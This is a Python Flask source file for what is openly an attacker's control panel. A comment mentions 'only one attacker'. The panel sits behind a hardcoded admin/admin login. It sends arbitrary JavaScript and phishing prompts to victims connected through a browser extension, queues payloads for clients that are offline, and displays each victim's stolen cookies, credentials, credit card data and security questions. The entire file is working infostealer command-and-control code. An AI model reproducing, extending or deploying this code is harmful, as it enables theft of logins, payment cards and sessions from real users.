from flask import Flask, render_template, request, redirect, url_for
from .forms import LoginForm
from flask_login import logout_user, login_user, login_required, LoginManager, UserMixin
from . import database, app
from .app import app as app_flask


login_manager = LoginManager()
login_manager.init_app(app_flask)
login_manager.login_view = 'login'
active_users = None


# user class not really sensible because only one attacker but necessary for implementing login
class User(UserMixin):
    def __init__(self, id):
        self.id = id

    def repr(self):
        return "admin"


@login_manager.user_loader
def load_user(userid):
    return User(userid)


@app_flask.route('/', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    error = None
    if form.validate_on_submit():
        if request.form['username'] == 'admin' and request.form['password'] == 'admin':
            user = User("admin")
            login_user(user)
            return redirect(url_for('attack_mode'))
        error = 'Invalid Credentials. Please try again.'
    return render_template('login.html', title='Log In', form=form, error=error)


@app_flask.route('/attackmode', methods=['GET', 'POST'])
@login_required
def attack_mode():
    with database.getConn() as cur:
        cur.execute("SELECT * FROM Client")
        data = cur.fetchall()
    active_users = [i[0] for i in app.connected_clients]
    return render_template('index2.html', data=data, active_users=active_users)


@app_flask.route('/update', methods=['POST'])
def update():
    return redirect(url_for('attack_mode'))


# logout
@app_flask.route("/logout", methods=['POST'])
@login_required
def logout():
    logout_user()
    return redirect(url_for('login', next=request.endpoint))


@app_flask.route('/sendjs', methods=['POST'])
def sendjs():
    a = request.form['js']
    b = request.form['id']
    c = a + '\n' + b
    # if active tell extension to send
    if (check_status(b)):
        return c
    else:
        update_payload(b, a)
    return c


@app_flask.route('/phish', methods=['POST'])
def phish():
    d = request.form['id']
    e = "Phish" + request.form['number']
    f = d + '\n' + e
    # if active tell extension to send
    if (check_status(d)):
        return f
    else:
        update_payload(d, e)
    return f


@app_flask.route('/getinfo', methods=['POST'])
def getinfo():
    userid = int(request.form['id'])
    with database.getConn() as cur:
        cur.execute('SELECT * FROM Client WHERE ID = (%s)', (userid,))
        record = cur.fetchone()
        cur.execute('SELECT * FROM Cookies WHERE CID = (%s)', (userid,))
        cookies = cur.fetchall()
        cur.execute('SELECT * FROM Credentials WHERE CID = (%s)', (userid,))
        credentials = cur.fetchall()
        cur.execute('SELECT * FROM CreditCard WHERE CID = (%s)', (userid,))
        creditcards = cur.fetchall()
        cur.execute('SELECT * FROM SecurityQuestions WHERE CID = (%s)', (userid,))
        questions = cur.fetchall()
    return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
                           creditcards=creditcards, questions=questions)


def update_payload(id, text):
    with database.getConn() as cur:
        cur.execute("UPDATE Client SET NextPayload = concat(NextPayload, (%s), '\n') WHERE ID = (%s)", (text, id))
        cur.commit()


def check_status(user):
    active_users = [i[0] for i in app.connected_clients]
    if (active_users.__contains__(user)):
        return True
    return False


if __name__ == '__main__':
    app_flask.run(debug=True)
